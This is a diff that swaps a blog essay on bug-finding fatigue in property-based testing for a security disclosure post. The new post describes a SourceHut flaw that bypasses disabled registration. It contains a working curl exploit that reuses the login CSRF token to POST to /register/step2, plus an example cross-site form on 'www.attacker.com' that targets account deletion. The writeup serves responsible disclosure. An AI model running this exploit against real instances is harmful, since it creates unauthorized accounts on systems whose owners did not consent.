@@ -1,27 +1,106 @@
-…is a question I’ve been asking for a week now, while developing [a new property-based testing (PBT) tool](https://github.com/datadog-labs/ephyra) in the meantime if you’re one to appreciate irony. As you know, a title with a question usually means the answer is **no**; but I wouldn’t expect I would ever be in a position to ask the question in the 6 years of working on this, so I thought it’s worth a discussion. Let me step back a bit though.
+So, last time I wrote about [account takeover using XSS on the CI platform of SourceHut](https://blog.arusekk.pl/posts/srht-account-takeover/).
 
-Property-based testing (PBT) is an “advanced” method of software testing; instead of testing a particular behavior as we classically do, we essentially define a “blueprint”, traditionally called a property. A property is a general fact about the system under test, like “running this program with ANY input should not lead to crash”, “addition of ANY TWO NUMBERS should be commutative”, or “my physics simulation should ALWAYS conserve momentum”. We can express these properties quite easily by writing functions from states or inputs to booleans; we then test them by randomly sampling the input space defined by inputs to those functions.
+This time I found something not nearly as ‘impactful’, but still interesting.
+Sorry for taking this long, but my SSD literally died<sup>[1](https://blog.arusekk.pl/posts/srht-disabled-registration-bypass/#fn:1)</sup> and while waiting for a warranty repair
+I had to buy a used one (have you seen the prices yet??)<sup>[2](https://blog.arusekk.pl/posts/srht-disabled-registration-bypass/#fn:2)</sup>.
+It finally arrived so here I am.
 
-The job of a testing researcher is, well, finding bugs, locating their root causes, and essentially helping the maintainers fix those bugs. Of course, these are essentially the way we work, not the value proposition; in my opinion the value proposition of testing research is to help build reliable software systems. PBT is only one of the approaches here, fuzzing, deterministic simulation testing, formal verification… all serve the same purpose with different trade-offs in different situations and domains.
+So, if you want me to work faster, just drop me some money.<sup>[3](https://blog.arusekk.pl/posts/srht-disabled-registration-bypass/#fn:3)</sup>
 
-A critical tension of testing research is the separation between the tester and the maintainer, the tester invariably approaches the system from outside, as a separate entity than the maintainer. The tester neither understands the system as well as the maintainer, nor are they incentivized or able to do so. I believe this tension is reaching a critical point with the AI age, and I am interested in understanding where we stand.
+## No NLP[#](https://blog.arusekk.pl/posts/srht-disabled-registration-bypass/#no-nlp)
 
-In the last month I apparently filed 500+ bug reports. I'm honestly quite proud of it; it’s the dream of a testing researcher to find novel bugs in well-tested systems. It's like you’re an athlete breaking a world record, at least a much more nerdy and much less impressive version of it. I tried to be very gracious when filing the bugs, I didn’t let an agent dump all of them but rather personally triaged as much as possible; but I couldn’t let out the feeling that if billions of people haven’t hit these cases, maybe they were just not that important in the first place.
+Again, as you might know,
+I am not very excited about the current wave of natural language processing.<sup>[4](https://blog.arusekk.pl/posts/srht-disabled-registration-bypass/#fn:4)</sup>
 
-The fact that I might be partially responsible for [the delay of Postgres19](https://rhaas.blogspot.com/2026/10/postgres-19-is-late-and-its-ais-fault.html?m=1) is quite frightening; although the concept of “fuzzer fatigue” isn’t really new,  Z3 prover was a popular target for fuzzers, which at the time led to some [heated discussions](https://github.com/Z3Prover/z3/issues/4461), SQLite maintainers operate at an incredible speed of fixing some bugs in 20 literal minutes, but I am sure they are unsurprisingly exhausted.
+*No NLP has been used in this research. The mistakes are all mine.*
 
-The single best argument in favor of bug finding is security, if we don’t find the bugs, the attackers will, and they will do bad things with them; this works particularly well for classical fuzzing. But especially with more recent work that I’m a part of where we test functional correctness properties of the systems, I think the value proposition shifts.
+## The background[#](https://blog.arusekk.pl/posts/srht-disabled-registration-bypass/#the-background)
 
-Don’t get me wrong, bugs are bugs, in all the bug reports I submitted it was only once that we discussed with the maintainers if the behavior was actually a bug; the question is more practical, *is it worth fixing all the bugs in a software even if no practical user will ever experience degradation because of the issue?*
+SourceHut has been undergoing quite an architectural change.
+Its frontend was first built using Flask and Jinja templates and SQLAlchemy.
+But, for performance reasons, and for other reasons
+(decoupling of business logic, graphql)
+the API has been ported over to Go.
 
-Even more so; is it worth spending valuable maintainer time on fixing a 10 year old bug nobody has ever hit in exchange for building a new capability that the users will actually use?
+## The problem[#](https://blog.arusekk.pl/posts/srht-disabled-registration-bypass/#the-problem)
 
-The position I came to conclusion is, to the damnation of my own effort in finding old bugs in existing systems, that testing is most valuable when it can go hand in hand with development. Testing that comes after the fact can be valuable for security vulnerability and silent failures; and we indeed cannot know what types of bugs we will encounter when we are testing a system, so when in doubt, we must test. We should, however, be selective in the bugs we report; even more so, the maintainers should be selective in the bugs they choose to fix. The ideological position that we must simply fix every single bug does not seem feasible to me at this moment.
+Back in 2021, while moving registration code from the frontend to the graphql backend,
+a subtle logic bug got introduced.
+While the frontend never shows a registration form, and states prominently
+‘registration is currently closed’,
+the form handler is still there.
+It correctly states that registration is closed on every error path,
+but on the happy path it does not seem to ever check it.
+So if you happen to remember how to submit the form…
 
-I came to this conclusion through the asymmetry in bug identification vs bug resolution. The reason I was able to manually go through 500+ bugs is because bugs are quite verifiable. Given a brief snippet, I can review the snippet, the expected behavior, the actual behavior; and with very high confidence present a report to the maintainers. Not only the fix for these simple snippets can range from a single line to multiple hundred lines, but also there are many possible fixes for a given bug. It is sometimes discussed if software has a finite or infinite number of bugs, which I believe is the wrong question. I believe software there is a finite set of fixes to a given software to fix all the bugs that violate a given property, however it is improbable that those are the fixes we actually apply. Hence, given a greedy approach where we apply the “simplest” fix for all bugs where we fix only the neighborhood of the test case we currently inspect, we might actually live in a world where we have to do infinitely many bug fixes. The fixes, therefore, must be carefully crafted, forward looking, and essentially much less verifiable than the bugs themselves.
+## The exploitation[#](https://blog.arusekk.pl/posts/srht-disabled-registration-bypass/#the-exploitation)
 
-![xkcd 1739: Fixing Problems](https://alperenkeles.com/posts/bug-finding-considered-harmful/./fixing-problems.png)
+You just need to `POST /register/step2` with your desired username, email and password.
+If the server in question disables registration, but has its SMTP configured properly
+(you still need to do email confirmation), boom, you are in.
 
-In the context of this asymmetry, I posit that bug finding will continue to overwhelm bug fixing, so it is left to us to account for this asymmetry so that we can continue to build software. Even in the context of formal verification where we can technically enumerate all bugs that invalidate a stated property, we will simply find more and more properties of a system to test for; correctness to me seems like a never ending pursuit of excellence.
+There is only one caveat, the csrf token —
+protection against Cross-Site Request Forgery,
+like a `www.attacker.com` containing `<form action="https://meta.sr.ht/profile/delete">` (or [307ing](https://blog.arusekk.pl/posts/srht-disabled-registration-bypass/307) there),
+because yes you can post forms to other sites, and yes the request will carry valid cookies.
+What other sites cannot know are the values of input fields in the form presented to you specifically,
+so the typical protection is `<input type="hidden" name="_csrf_token" value="1d02711ce5a3a17342...">`.
 
-I make these arguments in the context of *in vitro testing*, testing done after the fact as a method of hardening the system; on the other hand, I believe *in vivo testing* is more useful than ever, because we of course want to build correct systems given that we do not need to sacrifice usefulness, expressivity, performance… Especially as we get better verification capabilities, leveraging those capabilities to speed up the development instead of slowing it down could, and perhaps should be our norm.
+There is no registration form displayed, so there is no token.
+However, fortunately for us attackers, the token from /login works just fine.
+
+## The exploit[#](https://blog.arusekk.pl/posts/srht-disabled-registration-bypass/#the-exploit)
+
+```sh
+#!/bin/sh
+
+#META=https://meta.copyleft.market
+META=http://127.0.0.1:5000
+USERNAME=azurediamond
+EMAIL=test@example.com
+PASSWORD=hunter2
+
+csrf=$(curl -c cookie.txt $META/login |grep -A1 csrf |cut -d\' -f2 |tail -1)
+curl -v -b cookie.txt $META/register/step2 \
+        -d _csrf_token="$csrf" \
+        -d username="$USERNAME" \
+        -d email="$EMAIL" \
+        -d password="$PASSWORD"
+```
+
+## Some metadata, I guess?[#](https://blog.arusekk.pl/posts/srht-disabled-registration-bypass/#some-metadata-i-guess)
+
+- Affected versions: 0.56.11 through 0.88.9
+- Affected instances: at least 10 (GET WRITTEN PERMISSION BEFORE TESTING)
+- CVSS 4.0 (subjective): CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N/AU:N/R:U/V:D/RE:M/U:Green
+- Indicators of compromise: unknown user accounts (go to /users on meta)
+
+## Timeline[#](https://blog.arusekk.pl/posts/srht-disabled-registration-bypass/#timeline)
+
+- 2021-09-24 - vulnerability introduced
+- 2026-08-13 - I write ‘registration [on meta.copyleft.market] is disabled, so good luck getting anywhere’
+- 2026-09-24 - my SSD dies quite literally as I publish the writeup on the account takeover vulnerability
+- 2026-10-?? - I keep thinking about what I wrote back on 2026-08-13
+- 2026-11-02 - disclosure to SourceHut’s security mailing list
+- 2026-11-03 - ack, fix lands, downstream notified, this post published, CVE id requested from VulnCheck
+- 2026-11-03 - VulnCheck assigns CVE-2026-121728
+- some day, profit?
+
+## Summary[#](https://blog.arusekk.pl/posts/srht-disabled-registration-bypass/#summary)
+
+Lessons learned:
+
+- Refactors can swallow security checks.
+- Double check correctness on auth flows.
+- CSRF protection would prevent this if the token was scope-limited to the specific endpoint each form points to.
+- VulnCheck is nice but their contact channels can still get more responsive.
+
+Does anyone know a bug bounty program where the researcher pays an upfront participation fee?
+I will set mine up this way for sure, and you should consider it too, if you are drowning in submissions.
+
+As I said the last time, I am not done.  Stay tuned (follow me on all socials to be sure, and RSS of course) and <del>call</del> hire me maybe.
+
+1. it’s okay, I did make a backup [↩︎](https://blog.arusekk.pl/posts/srht-disabled-registration-bypass/#fnref:1)
+2. please can someone just… stop this madness? who else wants to just cut San Francisco off the Internet? or build a garage DRAM/SSD factory with me? can’t be that hard… [↩︎](https://blog.arusekk.pl/posts/srht-disabled-registration-bypass/#fnref:2)
+3. For example by [buying something](https://1clicklinux.org) or [donating](https://github.com/sponsors/Arusekk) or [donating](https://liberapay.com/Arusekk/) (every euro or dollar makes a difference to me). Or by signal boosting my paid projects! You can now hire me for professional consulting, too. [↩︎](https://blog.arusekk.pl/posts/srht-disabled-registration-bypass/#fnref:3)
+4. I mean, transformers *are* groundbreaking, but (not to make this text even longer) in the same sense that leaded fuel was groundbreaking. Cool, but so what. We had fuels before, and we have better fuels now. [↩︎](https://blog.arusekk.pl/posts/srht-disabled-registration-bypass/#fnref:4)
